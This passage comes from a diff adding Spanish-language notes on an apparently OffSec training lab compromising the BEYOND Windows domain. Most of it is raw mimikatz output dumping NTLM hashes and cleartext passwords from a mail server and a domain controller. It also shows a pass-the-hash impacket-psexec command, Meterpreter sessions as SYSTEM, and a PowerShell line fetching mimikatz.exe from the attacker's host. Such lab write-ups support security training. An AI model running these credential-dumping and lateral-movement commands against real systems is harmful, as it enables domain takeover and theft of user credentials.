+         * Password : c6 4b 0f 73 58 5b f5 86 fc 87 d3 c4 ea 62 b8 69 ec e2 cb 9a a2 47 5a be 46 ab 6d 50 1b 1f 3e e8 21 ea b1 40 12 50 ee c2 ab 79 be 47 e7 f4 ae c3 da 41 47 e7 02 d1 8e f5 c5 87 dc 6f 6c 9f dc 62 00 6b 71 c2 d3 6c bb 7d ab cb 9e 5c a9 8b 71 5a 60 08 42 8b 29 03 91 37 ca b9 99 30 8a 9d ec 56 4f 6b 12 ff 46 10 41 27 2e 67 ca 2e 1b 13 ba 26 ce d6 5f 27 54 66 97 a5 19 9d c1 fc c7 25 24 f9 18 19 03 f4 b0 2a 66 ca 52 7c 80 1b ce ad 37 4b d6 67 ea a5 fc 87 37 e1 60 be 16 9e e1 4d a4 f9 85 cc 3a d7 74 19 47 d1 df 25 d4 44 07 4d a7 56 99 bf 26 c3 1c 01 66 b1 c5 fb e7 62 51 01 82 2c f1 6d b4 10 62 3e f0 bf 13 53 de 2d c5 1b 11 18 df 0b 3d 5a 47 5b 82 d5 c3 a4 09 06 63 2c a5 a0 17 8f 5d d3 dc a4 ea 8f a8 52 61 da 4e 50 b7 c8 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 80964 (00000000:00013c44)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:02 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : MAILSRV1$
+         * Domain   : beyond.com
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MAILSRV1$
+Domain            : BEYOND
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:01 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : mailsrv1$
+         * Domain   : BEYOND.COM
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 50094 (00000000:0000c3ae)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:01 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : MAILSRV1$
+         * Domain   : beyond.com
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 50060 (00000000:0000c38c)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:01 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : MAILSRV1$
+         * Domain   : beyond.com
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 48912 (00000000:0000bf10)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:00 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 310880 (00000000:0004be60)
+Session           : Interactive from 1
+User Name         : beccy
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 5/3/2025 12:29:28 PM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+        msv :
+         [00000003] Primary
+         * Username : beccy
+         * Domain   : BEYOND
+         * NTLM     : f0397ec5af49971f6efbdb07877046b3
+         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+        tspkg :
+        wdigest :
+         * Username : beccy
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : beccy
+         * Domain   : BEYOND.COM
+         * Password : NiftyTopekaDevolve6655!#!
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:02 PM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:02 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MAILSRV1$
+Domain            : BEYOND
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:00 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : mailsrv1$
+         * Domain   : BEYOND.COM
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+```
+* Obtenemos con esto otra sesion meterpreter y ejecutamos mimikatz
+
+#### Movimiento lateral
+
+|user | hash | hostname | password | 
+|-----|------|--------|--------|
+| beccy | f0397ec5af49971f6efbdb07877046b3 | DCSRV1 | NiftyTopekaDevolve6655!#!| 
+| Administrator| 76821e8eeb84c0ec6446dbcc40ee2c99 | MAILSRV1 |
+
+1. impacket-psexec obtenemos de este shell una session meterpreter mas estable con met.exe
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
+└─# proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.187.240
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 172.16.187.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file xLXncqGl.exe
+[*] Opening SVCManager on 172.16.187.240.....
+[*] Creating service veLH on 172.16.187.240.....
+[*] Starting service veLH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+```
+
+2. MSF session 3
+
+```bash
+msf6 auxiliary(server/socks_proxy) > 
+[*] Sending stage (203846 bytes) to 192.168.231.242
+sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                     Connection
+  --  ----  ----                     -----------                     ----------
+  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1       192.168.45.213:443 -> 192.168.231.242:63275 (192.168.231.242)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ MAILSRV1  192.168.45.213:443 -> 192.168.231.242:53036 (192.168.231.242)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DCSRV1    192.168.45.213:443 -> 192.168.231.242:63422 (172.16.187.240)
+
+msf6 auxiliary(server/socks_proxy) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter > shell
+Process 3268 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>[*] Meterpreter session 3 opened (192.168.45.213:443 -> 192.168.231.242:63422) at 2025-06-25 18:50:59 -0300
+whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3A2A-FEA4
+
+ Directory of C:\Users\Administrator
+
+06/25/2025  02:48 PM    <DIR>          .
+09/27/2022  10:44 AM    <DIR>          ..
+09/27/2022  10:44 AM    <DIR>          3D Objects
+09/27/2022  10:44 AM    <DIR>          Contacts
+09/27/2022  10:44 AM    <DIR>          Desktop
+09/27/2022  10:44 AM    <DIR>          Documents
+09/27/2022  10:44 AM    <DIR>          Downloads
+09/27/2022  10:44 AM    <DIR>          Favorites
+03/01/2023  07:37 AM             1,378 lab.ps1
+09/27/2022  10:44 AM    <DIR>          Links
+06/25/2025  02:48 PM             7,168 met.exe
+09/27/2022  10:44 AM    <DIR>          Music
+09/27/2022  10:44 AM    <DIR>          Pictures
+09/27/2022  10:44 AM    <DIR>          Saved Games
+09/27/2022  10:44 AM    <DIR>          Searches
+09/27/2022  10:44 AM    <DIR>          Videos
+               2 File(s)          8,546 bytes
+              14 Dir(s)   7,622,844,416 bytes free
+
+C:\Users\Administrator>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
+iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
+PS C:\Users\Administrator> .\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 82640 (00000000:000142d0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
+         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
+         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DCSRV1$
+Domain            : BEYOND
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
+         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : dcsrv1$
+         * Domain   : BEYOND.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52299 (00000000:0000cc4b)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
+         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
+         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52281 (00000000:0000cc39)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
+         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
+         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52233 (00000000:0000cc09)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
+         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
+         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52220 (00000000:0000cbfc)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
+         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
+         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 502497 (00000000:0007aae1)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 5/3/2025 12:23:34 PM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : BEYOND
+         * NTLM     : 8480fa6ca85394df498139fe5ca02b95
+         * SHA1     : d6ba3f188d0ecf00e089ca064d1fbc8566dc1b14
+         * DPAPI    : 0f6271076fa7ddbdb444c50da3c75116
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : beyond.com
+         * Password : HotspotAarlockBurrito2@1!
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 82611 (00000000:000142b3)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:15 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
+         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : DCSRV1$
+         * Domain   : beyond.com
